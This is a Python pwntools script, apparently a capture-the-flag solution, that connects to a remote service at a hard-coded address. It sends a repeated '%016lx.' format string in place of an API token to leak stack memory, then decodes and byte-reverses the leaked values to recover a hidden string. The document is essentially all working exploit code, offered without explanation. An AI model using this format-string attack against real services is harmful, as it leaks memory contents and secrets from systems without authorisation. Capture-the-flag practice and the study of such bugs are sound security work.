#!/usr/bin/python3

from pwn import *

context.log_level = "debug"

r = remote("124.16.75.117", 51008)

r.sendlineafter("View my portfolio", b"1")
format_string = b"%016lx."
r.sendlineafter("What is your API token?", format_string * 50)
text = r.recvuntil("Portfolio")
text = text.decode("utf-8")[27:]
text = text.replace("Portfolio", "")
text = text.split(".")

text_processed = ""
for item in text:
    # Decode every byte to char
    if len(item) == 16:
        try:
            item = int(item, 16)
            item = item.to_bytes(8, "big")
            item = item.decode("utf-8")
            text_processed += item
        except (ValueError, UnicodeDecodeError):
            pass

# text = "ESeN6a1d384f38a17929"
print(text_processed)

# Split by 4 characters and reverse every group
reversed_text = "".join(
    text_processed[i : i + 8][::-1] for i in range(0, len(text_processed), 8)
)

print(reversed_text)



r.interactive()
